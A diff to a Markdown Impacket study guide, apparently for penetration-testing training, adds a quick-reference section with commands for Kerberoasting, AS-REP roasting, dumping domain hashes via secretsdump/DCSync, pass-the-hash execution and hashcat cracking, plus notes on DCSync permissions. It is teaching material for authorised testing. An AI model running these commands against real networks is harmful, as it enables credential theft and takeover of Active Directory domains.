@@ -48,6 +48,56 @@
 
 ---
 
+## Quick Reference
+
+> **Naming note:** `apt`/Kali installs prefix every script with `impacket-` and drop `.py`  
+> (e.g. `impacket-secretsdump`). A `pip`/`pipx` install keeps the original `.py` names  
+> (e.g. `secretsdump.py`). Both forms are shown below.
+
+### Essential Commands
+```bash
+# Kerberoasting
+impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.1 -request
+
+# ASREProasting
+impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass
+
+# Dump SAM / NTDS
+impacket-secretsdump corp.local/admin:pass@10.10.10.1
+
+# Remote exec (pass-the-hash)
+impacket-psexec -hashes :NTLM_HASH corp.local/admin@10.10.10.1
+
+# SMB share enumeration
+impacket-smbclient corp.local/user:pass@10.10.10.1
+```
+
+### Common Scenarios
+```bash
+# Kerberoast and crack
+impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.1 -request -outputfile spns.txt
+hashcat -m 13100 spns.txt rockyou.txt
+
+# Dump NTDS.dit hashes
+impacket-secretsdump corp.local/admin@10.10.10.1 -just-dc-ntlm
+
+# PTH with wmiexec (stealthier than psexec)
+impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
+```
+
+### Key Options
+| Flag | Meaning |
+|------|---------|
+| `-hashes LMHASH:NTLM` | Pass-the-hash auth |
+| `-k` | Kerberos auth (needs valid TGT) |
+| `-no-pass` | No password (AS-REP roasting) |
+| `-dc-ip` | Domain controller IP |
+| `-target-ip` | Target machine IP (if different from DC) |
+| `-just-dc-ntlm` | secretsdump: dump NTLM hashes only |
+| `-request` | GetUserSPNs: request TGS tickets |
+
+---
+
 # PHASE 1: FUNDAMENTALS
 
 ---
@@ -169,7 +219,7 @@
 | **Syntax** | Local hashes: `impacket-secretsdump domain/admin:Password123@<target>`. DCSync (from DC): `impacket-secretsdump domain/admin:Password123@<DC> -just-dc-ntlm`. Just DC users: `impacket-secretsdump domain/admin:Password123@<DC> -just-dc-user krbtgt`. |
 | **Real-World Scenario** | You've compromised a Domain Admin account. Run secretsdump against the DC to extract every domain user's NTLM hash. This is the "keys to the kingdom" moment. |
 | **Expected Output** | SAM hashes from local targets. ALL domain NTLM hashes from a DC (via DCSync). LSA secrets (may contain service account passwords in plaintext). |
-| **Common Mistakes** | Running against a member server expecting all domain hashes (you need a Domain Controller for DCSync). Not having Domain Admin or DCSync-equivalent privileges. Not saving output to file (`-outputfile hashes`). Not understanding that DCSync mimics domain replication — it doesn't access the filesystem directly. |
+| **Common Mistakes** | Running against a member server expecting all domain hashes (you need a Domain Controller for DCSync). Not having Domain Admin or DCSync-equivalent privileges. **DCSync requires specific permissions:** `DS-Replication-Get-Changes` AND `DS-Replication-Get-Changes-All` rights on the domain object. Domain Admins, Enterprise Admins, and Administrators groups have these by default. If DCSync fails, check permissions with BloodHound's "Find Principals with DCSync Rights" query. Not saving output to file (`-outputfile hashes`). Not understanding that DCSync mimics domain replication — it doesn't access the filesystem directly. |
 
 ---
 
